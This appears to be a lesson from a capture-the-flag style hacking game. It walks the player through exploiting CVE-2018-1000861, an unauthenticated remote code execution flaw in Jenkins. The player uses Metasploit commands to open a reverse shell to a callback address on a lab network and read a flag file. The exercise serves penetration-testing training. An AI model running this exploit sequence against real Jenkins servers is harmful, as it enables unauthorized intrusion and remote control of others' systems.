PHASE 3 — OPERATIONS
════════════════════
tool:  msfconsole

You found the bug in phase 2: CVE-2018-1000861, unauth RCE in
Jenkins 2.121.1. Now we walk through it.

The blueprint we want is on the Jenkins host at:

    /var/m0use/blueprint.txt

Your job: use the metasploit module for this CVE to pop a shell on
the Jenkins box, read that file, and submit the flag from inside.


THE METASPLOIT WORKFLOW
───────────────────────
Same pattern for any CVE you'll ever exploit with metasploit:

    1. search        find the module by CVE id
    2. use           select it
    3. show options  see what params it needs
    4. set RHOSTS    point it at the target
    5. set LHOST     your callback address (for the reverse shell)
    6. check         confirm the target is actually vulnerable
    7. exploit       fire it; if it works, you get a shell


YOUR FIRST RUN
──────────────
Start metasploit:

    msfconsole

That drops you into the metasploit REPL. The prompt changes from
your normal shell prompt to:

    msf6 >

Now look up the module for CVE-2018-1000861:

    search CVE-2018-1000861

It'll show one matching module. Load it:

    use 0

The prompt now shows which module you're in. Check what options
it needs:

    show options

You'll see RHOSTS (target host) and LHOST (your callback) are
required and empty. Set them:

    set RHOSTS 10.4.12.1
    set LHOST 10.4.12.99

Confirm the target is actually vulnerable before firing:

    check

If check returns "The target is vulnerable", fire:

    exploit

Metasploit sends the payload, opens a reverse shell back to you,
and drops you onto the target. The prompt goes blank — you're now
typing commands AS the jenkins user on the Jenkins box.

Read the blueprint:

    cat /var/m0use/blueprint.txt

The flag is in the file's text. When you have it, type:

    exit

That returns you to the msfconsole prompt. Type `exit` again to
leave metasploit entirely. Then type the flag at the m0usenet
prompt to advance.

Stuck?  cat hint  — no penalty.
